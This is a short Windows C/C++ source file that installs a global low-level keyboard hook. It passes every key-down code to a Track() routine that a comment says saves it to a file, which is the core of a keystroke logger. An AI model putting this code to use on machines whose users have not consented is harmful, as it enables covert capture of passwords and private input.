#include "headers\\input_module.h"
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);

            // save to file
            Track(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}